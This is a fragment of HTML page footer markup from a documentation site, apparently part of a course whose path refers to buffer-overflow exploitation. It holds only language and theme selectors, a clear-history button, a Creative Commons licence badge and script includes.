        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter"></div>
        <div id="R-menu-footer">
          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter">
          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks">
            <ul>
              <li id="R-select-language-container" class="footerLangSwitch">
                <div class="padding menu-control">
                  <i class="fa-fw fas fa-language"></i>
                  <span>&nbsp;</span>
                  <div class="control-style">
                    <label class="a11y-only" for="R-select-language">Language</label>
                    <select id="R-select-language" onchange="location = this.querySelector( this.value ).dataset.url;">
                      <option id="R-select-language-en" value="#R-select-language-en" data-url="/420-513/exploitation/bof/index.html" lang="fr-ca" selected></option>
                    </select>
                  </div>
                  <div class="clear"></div>
                </div>
              </li>
              <li id="R-select-variant-container" class="footerVariantSwitch">
                <div class="padding menu-control">
                  <i class="fa-fw fas fa-paint-brush"></i>
                  <span>&nbsp;</span>
                  <div class="control-style">
                    <label class="a11y-only" for="R-select-variant">Theme</label>
                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
                      <option id="R-select-variant-red" value="red" selected>Red</option>
                    </select>
                  </div>
                  <div class="clear"></div>
                </div>
                <script>window.variants && variants.markSelectedVariant();</script>
              </li>
              <li class="footerVisitedLinks">
                <div class="padding menu-control">
                  <i class="fa-fw fas fa-history"></i>
                  <span>&nbsp;</span>
                  <div class="control-style">
                    <button onclick="clearHistory();">Clear History</button>
                  </div>
                  <div class="clear"></div>
                </div>
              </li>
            </ul>
          </div>
          <div id="R-footer" class="footerFooter showFooter"><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Licence Creative Commons"
        style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" /></a><br>Creative Commons
BY-NC-SA
          </div>
        </div>
      </div>
    </aside>
    <script src="/420-513/js/clipboard.min.js?1731358439" defer></script>
    <script src="/420-513/js/perfect-scrollbar.min.js?1731358439" defer></script>
    <script src="/420-513/js/theme.js?1731358439" defer></script>
  </body>
</html>
